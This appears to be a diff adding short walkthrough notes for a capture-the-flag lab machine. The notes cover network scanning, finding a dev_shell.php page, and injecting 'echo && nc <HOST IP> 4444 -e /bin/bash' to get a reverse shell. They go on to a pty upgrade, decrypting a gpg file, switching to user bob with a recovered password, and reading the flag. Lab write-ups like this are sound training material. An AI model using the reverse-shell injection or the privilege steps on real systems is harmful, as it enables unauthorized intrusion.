@@ -1,0 +1,30 @@
+* netdiscover 
+  - FOUND the IP address of the machine
+  
+* nmap <IP>
+  - ports 22 and 80 open
+  
+* Nikto -h <IP>
+  - FOUND robots.txt
+  - FOUND dev_shell.php (intresting)
+  
+* nc -lvnp 4444
+
+* http://<IP>/dev_shell.php
+  - echo && nc <HOST IP> 4444 -e /bin/bash
+  - in as www-data
+  
+* python -c 'import pty; pty.spawn("/bin/bash")'
+  - FOUND 3 users
+  - FOUND a login.txt.gpg in Bob
+  
+* gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
+  - The passphrase was found by seeing all the capital letters in notes.sh
+  - FOUND password for Bob = b0bcat_
+  
+* su bob
+  - enter B0bcat_ as password
+  
+* cd /
+
+* cat flag.txt
